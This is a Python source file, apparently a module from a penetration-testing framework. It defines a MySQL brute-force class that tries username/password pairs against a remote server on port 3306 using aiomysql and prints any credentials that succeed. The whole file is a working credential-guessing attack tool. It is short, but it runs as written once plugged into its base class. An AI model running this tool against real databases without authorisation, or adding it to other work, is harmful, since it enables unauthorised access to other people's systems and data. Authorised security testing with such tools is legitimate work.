import aiomysql

from modules.brute_force.bruteforce_login import AsyncBruteForceLogin, StopError


class MySQLBruteForce(AsyncBruteForceLogin):

    def __init__(self):
        super().__init__("mysql_bruteforce",
                         ["mysql", "sql", "brute", "force", "bruteforce"],
                         "brute force mysql server",
                         port=3306)

    async def login(self, username: str, password: str):
        try:
            await aiomysql.connect(host=self.rhost,
                                   port=self.rport,
                                   user=username,
                                   password=password)
            print(f"[+] password found: {username}:{password}")

            if self.stop_on_success:
                raise StopError
            return True
        except aiomysql.Error:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")
        return False
